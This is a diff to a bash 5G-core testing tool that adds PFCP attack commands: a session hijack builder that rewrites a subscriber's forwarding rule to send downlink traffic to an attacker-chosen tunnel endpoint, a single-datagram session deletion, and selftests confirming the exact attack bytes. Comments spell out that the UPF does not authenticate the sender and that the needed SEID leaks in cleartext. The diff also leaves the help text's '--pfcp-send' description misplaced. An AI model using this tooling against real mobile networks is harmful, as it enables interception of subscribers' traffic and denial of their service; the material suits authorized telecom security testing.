@@ -636,7 +636,7 @@ ncore_pfcp_session_type() {
 # traffic endpoint groups) plus Application ID's PFDs (Table 7.4.3.1-2).
 ncore_pfcp_ie_grouped() {
     case "${1:-}" in
-        1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|58|84|85|86|87|128|129|130)
+        1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|58|85|86|128|129|130)
             return 0 ;;
     esac
     return 1
@@ -881,6 +881,86 @@ ncore_cmd_pfcp_build() {  # [teid] [ue-ip] [seq] [seid] [upf-ip]
 # not a target, and one typo must not be the difference.  The datagram proves
 # only that the kernel accepted it -- PFCP has no acknowledgement of its own
 # outside the response message -- so a silent peer is reported as unconfirmed.
+# ── C4: a session the SMF does not own ─────────────────────────────────
+# PFCP has no per-message key: a peer that can reach UDP 8805 and name a SEID
+# is treated as the SMF. The SEID is not a secret either -- a UPF hands it
+# back in the Session Establishment Response in the clear. So the whole
+# hijack is (1) learn the SEID, (2) send a Session Modification Request that
+# repoints forwarding.
+#
+# The redirection sits in the Update FAR: Outer Header Creation (IE 84) names
+# a new GTP-U tunnel endpoint, and a UPF that honours it sends the user plane
+# to a TEID and address the sender chose. This builder produces exactly that
+# message; the sender it would ride is --pfcp-send.
+ncore_pfcp_outer_header_creation() {  # <teid> <ipv4> [description]
+    local teid="${1:-}" ip="${2:-}" desc="${3:-0001}"
+    [[ "$teid" =~ ^[0-9]+$ ]] || { printf 'ERROR\tTEID must be numeric\n' >&2; return 2; }
+    [[ "$desc" =~ ^[0-9a-fA-F]{4}$ ]] || {
+        printf 'ERROR\tOuter Header Creation description is two octets of hex\n' >&2
+        printf 'WHY\tTS 29.244 8.2.56 Table 8.2.56-1 puts the GTP-U/UDP/IPv4 bit in the low octet (0x01) and the rest in the high one\n' >&2
+        return 2; }
+    local addr; addr=$(ncore_pfcp_ipv4_hex "$ip") || return 2
+    ncore_pfcp_ie 84 "$(printf '%s%s%s' "$desc" "$(ncore_pfcp_u32 "$teid")" "$addr")"
+}
+
+ncore_pfcp_build_hijack() {  # <seid> [teid] [attacker-ip] [far-id] [seq]
+    local seid="${1:-}" teid="${2:-4242}" ap_ip="${3:-127.0.0.1}" far="${4:-1}" seq="${5:-1}"
+    [[ "$seid" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--pfcp-hijack needs the session SEID the UPF assigned (it is in the establishment response in the clear)\n' >&2
+        return 2; }
+    local ufp ufar body
+    ufp=$(ncore_pfcp_ie 42 00) || return 2                 # Destination Interface: access
+    ufp+=$(ncore_pfcp_outer_header_creation "$teid" "$ap_ip") || return 2
+    ufar=$(ncore_pfcp_ie 108 "$(ncore_pfcp_u32 "$far")") || return 2
+    ufar+=$(ncore_pfcp_ie 44 02) || return 2               # Apply Action: FORW
+    ufar+=$(ncore_pfcp_ie 11 "$ufp") || return 2           # Update Forwarding Parameters
+    body=$(ncore_pfcp_ie 10 "$ufar") || return 2           # Update FAR
+    ncore_pfcp_msg 52 "$seq" "$body" "$seid" || return 2
+}
+
+ncore_cmd_pfcp_hijack() {  # <seid> [teid] [attacker-ip] [far-id]
+    local seid="${1:-}" teid="${2:-4242}" ip="${3:-127.0.0.1}" far="${4:-1}"
+    if [[ -z "$seid" ]]; then
+        printf 'ERROR\t--pfcp-hijack needs the session SEID (from an Establishment Response)\n' >&2
+        return 2
+    fi
+    local hex
+    hex=$(ncore_pfcp_build_hijack "$seid" "$teid" "$ip" "$far" 1) || return $?
+    local dec; dec=$(ncore_decode_pfcp "$hex") || return 1
+    printf 'message\tSession Modification Request\n'
+    printf 'message_type\t52\n'
+    printf 'seid\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="seid"{print $2; exit}')"
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    printf 'hex\t%s\n' "$hex"
+    printf 'update_far\t%s\n' "$far"
+    printf 'outer_header_creation\t%s\n' "$(ncore_pfcp_outer_header_creation "$teid" "$ip")"
+    printf 'outer_header_creation_value\t%s\n' \
+        "$(ncore_pfcp_outer_header_creation "$teid" "$ip" | cut -c9-)"
+    printf 'destination\t%s\n' "$ip"
+    printf 'new_endpoint\t%s:%s\n' "$ip" "$teid"
+    printf 'decode_ok\t%s\n' "$([[ -n "$dec" ]] && echo yes || echo no)"
+    printf 'ie_count\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="ie_count"{print $2; exit}')"
+    printf 'length_agrees\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="length_agrees"{print $2; exit}')"
+    printf 'attack\tthe UPF installed this session for one subscriber; this message repoints its downlink tunnel at <attacker-ip>:<teid>, so the next packets for that subscriber arrive at the sender instead\n'
+    printf 'requires\tone reachable UPF on UDP 8805 and the SEID from a Session Establishment Response (cleartext); send with --pfcp-send <upf> 8805 <hex>\n'
+    printf 'blunt\tthe UPF does not authenticate the sender: no key, no certificate, no challenge -- reachability is the whole control\n'
+}
+
+ncore_cmd_pfcp_delete() {  # <seid> [seq]
+    local seid="${1:-}" seq="${2:-1}"
+    [[ "$seid" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--pfcp-delete needs the session SEID\n' >&2; return 2; }
+    local hex; hex=$(ncore_pfcp_msg 54 "$seq" "" "$seid") || return 1
+    printf 'message\tSession Deletion Request\n'
+    printf 'message_type\t54\n'
+    printf 'seid\t%s\n' "$seid"
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    printf 'hex\t%s\n' "$hex"
+    printf 'decode_ok\t%s\n' "$(ncore_decode_pfcp "$hex" >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'attack\ta single datagram addressed by SEID tears down a live session: the subscriber loses its user plane without a detach, and nothing in PFCP asks who sent it\n'
+    printf 'requires\tthe same reachability a --pfcp-send needs; the SEID is in the establishment response\n'
+}
+
 ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex]
     local host="${1:-}" port="${2:-8805}" hex="${3:-}"
     local tool="$IMSISTING_ROOT/tools/udp_assoc.py"
@@ -1857,6 +1937,28 @@ ncore_selftest() {
     # Session Deletion Request = 54.
     chk pfcp-del      "$(fld "$(ncore_decode_pfcp '21 36 0004 0000000000000001 000001 00')" message_type_name)" "Session Deletion Request"
     chk pfcp-unknown  "$(fld "$(ncore_decode_pfcp '20 63 0004 000001 00')" message_type_name)" "unknown (99)"
+
+    # C4 -- the session hijack: a Session Modification Request that repoints a
+    # live session's FAR at the operator's own tunnel endpoint.
+    out=$(ncore_cmd_pfcp_hijack 123456789 4242 203.0.113.9 1)
+    chk hijack-name   "$(fld "$out" message)"              "Session Modification Request"
+    chk hijack-type   "$(fld "$out" message_type)"         "52"
+    chk hijack-seid   "$(fld "$out" seid)"                 "123456789"
+    chk hijack-far    "$(fld "$out" update_far)"          "1"
+    chk hijack-ohc    "$(fld "$out" outer_header_creation_value)" "000100001092CB007109"
+    chk hijack-dst    "$(fld "$out" destination)"          "203.0.113.9"
+    chk hijack-ie     "$(fld "$out" ie_count)"             "1"
+    chk hijack-dec    "$(fld "$out" decode_ok)"            "yes"
+    h=$(fld "$out" hex)
+    chk hijack-head   "${h:0:4}"                           "2134"
+    chk hijack-decode "$(fld "$(ncore_decode_pfcp "$h")" ie.0.2.1.name)" "Outer Header Creation"
+    out=$(ncore_cmd_pfcp_hijack)
+    chk hijack-noarg  "$(ncore_cmd_pfcp_hijack >/dev/null 2>&1; echo $?)" "2"
+    chk hijack-bad-ip "$(ncore_cmd_pfcp_hijack 1 4242 300.1.1.1 >/dev/null 2>&1; echo $?)" "2"
+    out=$(ncore_cmd_pfcp_delete 123456789)
+    chk delete-type   "$(fld "$out" message_type)"         "54"
+    chk delete-seid   "$(fld "$out" seid)"                 "123456789"
+    chk delete-dec    "$(fld "$out" decode_ok)"            "yes"
     chk pfcp-bad-ver  "$(ncore_decode_pfcp '40 01 0004 000001 00' >/dev/null 2>&1; echo $?)" "1"
     chk pfcp-bad-short "$(ncore_decode_pfcp '20 01' >/dev/null 2>&1; echo $?)" "1"
 
@@ -2169,6 +2271,8 @@ ncore_cli_main() {
         --pfcp-build)      ncore_cmd_pfcp_build "${1:-1}" "${2:-10.45.0.2}" "${3:-1}" \
                                                 "${4:-0}" "${5:-10.45.0.1}" ;;
         --pfcp-send)       ncore_cmd_pfcp_send "${1:-}" "${2:-8805}" "${3:-}" ;;
+        --pfcp-hijack)     ncore_cmd_pfcp_hijack "${1:-}" "${2:-4242}" "${3:-127.0.0.1}" "${4:-1}" ;;
+        --pfcp-delete)     ncore_cmd_pfcp_delete "${1:-}" "${2:-1}" ;;
         --ngap-initial-ue)  ncore_cmd_ngap_initial_ue "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
         --ngap-downlink-nas) ncore_cmd_ngap_downlink_nas "${1:-}" "${2:-}" "${3:-}" ;;
         --ngap-ngsetup)     ncore_cmd_ngap_ngsetup "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
@@ -2202,6 +2306,10 @@ Usage: $0 COMMAND
   --pfcp-build [teid] [ue-ip] [seq] [seid] [upf-ip]
                                 build a Session Establishment Request (type 50)
   --pfcp-send <upf-host> [port] [hex]
+  --pfcp-hijack <seid> [teid] [attacker-ip] [far-id]
+                                C4: the Session Modification Request that
+                                repoints a live session at your tunnel
+  --pfcp-delete <seid> [seq]    one datagram that tears the session down
                                 send it on UDP 8805
   --ngap-initial-ue [ran-ue-id] [nas-hex] [nci-hex] [cause]
                                 build an InitialUEMessage with its NAS-PDU
